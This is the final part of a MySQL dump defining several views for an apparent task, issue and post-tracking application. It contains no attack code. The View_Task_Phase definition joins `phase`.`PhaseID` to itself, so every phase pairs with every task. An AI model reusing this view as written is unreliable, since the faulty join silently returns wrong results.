/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Task_Phase` AS select `phase`.`PhaseID` AS `PhaseID`,`phase`.`Description` AS `PhaseDescription`,`phase`.`PhaseName` AS `PhaseName`,`task`.`TaskID` AS `TaskID`,`task`.`TaskName` AS `TaskName`,`task`.`Description` AS `Description`,`task`.`StartDate` AS `StartDate`,`task`.`EndDate` AS `EndDate`,`task`.`ProjectID` AS `ProjectID`,`task`.`CreatedDate` AS `CreatedDate`,`task`.`CreatorID` AS `CreatorID`,`task`.`TaskGroupID` AS `TaskGroupID`,`task`.`Progress` AS `Progress`,`task`.`ParentID` AS `ParentID`,`task`.`PerformerID` AS `PerformerID`,`task`.`Status` AS `Status`,`task`.`FinishDate` AS `FinishDate`,`task`.`AssignorID` AS `AssignorID`,`task`.`Active` AS `Active` from ((`phase` join `taskphase` on((`phase`.`PhaseID` = `phase`.`PhaseID`))) join `task` on((`taskphase`.`TaskID` = `task`.`TaskID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Task_Project`
--

/*!50001 DROP VIEW IF EXISTS `View_Task_Project`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Task_Project` AS select `task`.`TaskID` AS `TaskID`,`task`.`TaskName` AS `TaskName`,`task`.`Description` AS `Description`,`task`.`StartDate` AS `StartDate`,`task`.`EndDate` AS `EndDate`,`task`.`ProjectID` AS `ProjectID`,`task`.`CreatedDate` AS `CreatedDate`,`task`.`CreatorID` AS `CreatorID`,`task`.`TaskGroupID` AS `TaskGroupID`,`task`.`Progress` AS `Progress`,`task`.`ParentID` AS `ParentID`,`task`.`PerformerID` AS `PerformerID`,`task`.`Status` AS `Status`,`task`.`FinishDate` AS `FinishDate`,`task`.`AssignorID` AS `AssignorID`,`task`.`Active` AS `Active`,`creator`.`FullName` AS `CreatorName`,`taskgroup`.`TaskGroupName` AS `TaskGroupName`,`performer`.`FullName` AS `PerformerName`,`performer`.`Avatar` AS `PerformerAvatar`,`assignor`.`FullName` AS `AssignorName`,`creator`.`Avatar` AS `CreatorAvatar` from ((((`task` left join `View_Employee_Info` `creator` on((`creator`.`EmployeeID` = `task`.`CreatorID`))) left join `taskgroup` on((`task`.`TaskGroupID` = `taskgroup`.`TaskGroupID`))) left join `View_Employee_Info` `performer` on((`task`.`PerformerID` = `performer`.`EmployeeID`))) left join `View_Employee_Info` `assignor` on((`task`.`AssignorID` = `assignor`.`EmployeeID`))) where (`task`.`ParentID` is null) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Watcher_Issue`
--

/*!50001 DROP VIEW IF EXISTS `View_Watcher_Issue`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Watcher_Issue` AS select `issuewatcher`.`EmployeeID` AS `WatcherID`,`issue`.`IssueID` AS `IssueID`,`issue`.`IssueKey` AS `IssueKey`,`issue`.`IssueName` AS `IssueName`,`issue`.`Description` AS `Description`,`issue`.`CustomerInfoID` AS `CustomerInfoID`,`issue`.`ReceptionDate` AS `ReceptionDate`,`issue`.`CreatorID` AS `CreatorID`,`issue`.`AssigneeID` AS `AssigneeID`,`issue`.`CreatedDate` AS `CreatedDate`,`issue`.`ModifiedDate` AS `ModifiedDate`,`issue`.`DesiredDate` AS `DesiredDate`,`issue`.`IssueStatus` AS `IssueStatus`,`issue`.`SolutionID` AS `SolutionID`,`issue`.`PreliminarySolution` AS `PreliminarySolution`,`issue`.`ProjectID` AS `ProjectID`,`issue`.`ProjectVersionID` AS `ProjectVersionID`,`issue`.`IssueTypeID` AS `IssueTypeID`,`issue`.`Priority` AS `Priority`,`creator`.`FullName` AS `CreatorName`,`creator`.`EmployeeCode` AS `CreatorCode`,`creator`.`Avatar` AS `CreatorAvatar`,`assignee`.`FullName` AS `AssigneeName`,`assignee`.`Avatar` AS `AssigneeAvatar`,`assignee`.`EmployeeCode` AS `AssigneeCode`,`customerinfo`.`PhoneNumber` AS `CustomerPhoneNumber`,`customerinfo`.`Email` AS `CustomerEmail`,`customerinfo`.`ContactInfo` AS `CustomerContactInfo`,`issuetype`.`IssueTypeName` AS `IssueTypeName`,`issuetype`.`Avatar` AS `IssueTypeAvatar`,`issuetype`.`Description` AS `IssueTypeDescription`,`issuesolution`.`SolutionName` AS `SolutionName` from ((((((`issuewatcher` join `issue` on((`issuewatcher`.`IssueID` = `issue`.`IssueID`))) left join `View_Employee_Info` `creator` on((`issue`.`CreatorID` = `creator`.`EmployeeID`))) left join `View_Employee_Info` `assignee` on((`issue`.`AssigneeID` = `assignee`.`EmployeeID`))) left join `issuetype` on((`issue`.`IssueTypeID` = `issuetype`.`IssueTypeID`))) left join `customerinfo` on((`issue`.`CustomerInfoID` = `customerinfo`.`CustomerInfoID`))) left join `issuesolution` on((`issue`.`SolutionID` = `issuesolution`.`SolutionID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;

--
-- Final view structure for view `View_Watcher_Post`
--

/*!50001 DROP VIEW IF EXISTS `View_Watcher_Post`*/;
/*!50001 SET @saved_cs_client          = @@character_set_client */;
/*!50001 SET @saved_cs_results         = @@character_set_results */;
/*!50001 SET @saved_col_connection     = @@collation_connection */;
/*!50001 SET character_set_client      = utf8 */;
/*!50001 SET character_set_results     = utf8 */;
/*!50001 SET collation_connection      = utf8_general_ci */;
/*!50001 CREATE ALGORITHM=UNDEFINED */
/*!50013 DEFINER=`tranlam`@`%` SQL SECURITY DEFINER */
/*!50001 VIEW `View_Watcher_Post` AS select `postwatcher`.`EmployeeID` AS `WatcherID`,`post`.`PostID` AS `PostID`,`post`.`ProjectID` AS `ProjectID`,`post`.`AuthorID` AS `AuthorID`,`post`.`Content` AS `Content`,`post`.`PostCategoryID` AS `PostCategoryID`,`post`.`CreatedDate` AS `CreatedDate`,`post`.`ModifiedDate` AS `ModifiedDate`,`post`.`Title` AS `Title`,`author`.`EmployeeCode` AS `AuthorCode`,`author`.`FullName` AS `AuthorName`,`author`.`Avatar` AS `AuthorAvatar`,`postcategory`.`CategoryName` AS `PostCategoryName` from (((`postwatcher` join `post` on((`postwatcher`.`PostID` = `post`.`PostID`))) left join `View_Employee_Info` `author` on((`post`.`AuthorID` = `author`.`EmployeeID`))) left join `postcategory` on((`post`.`PostCategoryID` = `postcategory`.`PostCategoryID`))) */;
/*!50001 SET character_set_client      = @saved_cs_client */;
/*!50001 SET character_set_results     = @saved_cs_results */;
/*!50001 SET collation_connection      = @saved_col_connection */;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-08-11 11:12:59
